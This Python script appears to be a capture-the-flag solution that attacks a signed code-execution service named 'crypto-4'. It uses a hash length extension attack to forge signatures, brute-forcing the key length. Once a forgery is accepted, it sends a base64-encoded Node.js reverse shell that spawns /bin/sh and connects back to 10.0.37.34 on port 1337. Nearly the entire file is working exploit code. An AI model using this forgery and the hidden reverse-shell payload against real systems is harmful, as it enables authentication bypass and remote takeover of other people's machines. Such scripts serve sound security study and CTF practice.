#!/usr/bin/env python3

import requests
from hashpumpy import hashpump
from base64 import b64decode, b64encode

# Example:
# https://ctftime.org/writeup/15069

originalData = 'ZnVuY3Rpb24gaGVsbG8obmFtZSkgewogIHJldHVybiAnSGVsbG8gJyArIG5hbWUgKyAnISc7Cn0KCmhlbGxvKCdXb3JsZCcpOyAvLyBzaG91bGQgcHJpbnQgJ0hlbGxvIFdvcmxkJw=='
originalSig = 'aaa8111b4871b48dc6c0ac4c33ef9e1b'
testData = b64decode('OwpoZWxsbygnSmFjaycpOw==')
rceData = b64decode('OwooZnVuY3Rpb24oKXsKdmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpLApjcCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKSwKc2ggPSBjcC5zcGF3bigiL2Jpbi9zaCIsIFtdKTsKdmFyIGNsaWVudCA9IG5ldyBuZXQuU29ja2V0KCk7CmNsaWVudC5jb25uZWN0KDEzMzcsICIxMC4wLjM3LjM0IiwgZnVuY3Rpb24oKXsKY2xpZW50LnBpcGUoc2guc3RkaW4pOwpzaC5zdGRvdXQucGlwZShjbGllbnQpOwpzaC5zdGRlcnIucGlwZShjbGllbnQpOwp9KTsKcmV0dXJuIC9hLzsKfSkoKTs=')

def forge(keyLen, addedData=testData):
    newHash, newData = hashpump(originalSig, b64decode(originalData), addedData, keyLen)
    return newHash, b64encode(newData)

def postData(sig, code):
    resp = requests.post('http://crypto-4', json={'sig':sig, 'code':code})
    return resp.text

for i in range(50):
    forgedSig, forgedData = forge(i)
    ret = postData(forgedSig, forgedData)

    if 'invalid' not in ret:
        print(f'\n{ret}\nkeyLen: {i}')
        
        forgedSig, forgedData = forge(i, rceData)
        print(postData(forgedSig, forgedData))
        break
